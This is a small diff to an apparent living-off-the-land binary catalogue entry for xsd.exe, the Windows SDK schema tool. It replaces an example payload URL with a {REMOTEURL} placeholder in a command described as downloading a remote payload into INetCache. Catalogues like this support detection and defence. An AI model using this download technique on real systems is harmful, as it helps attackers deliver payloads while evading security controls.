@@ -4,7 +4,7 @@ Description: XML Schema Definition Tool included with the Windows Software Devel
 Author: Avihay Eldad
 Created: 2024-04-09
 Commands:
-  - Command: xsd.exe http://example.com/payload
+  - Command: xsd.exe {REMOTEURL}
     Description: Downloads payload from remote server
     Usecase: It will download a remote payload and place it in INetCache
     Category: Download
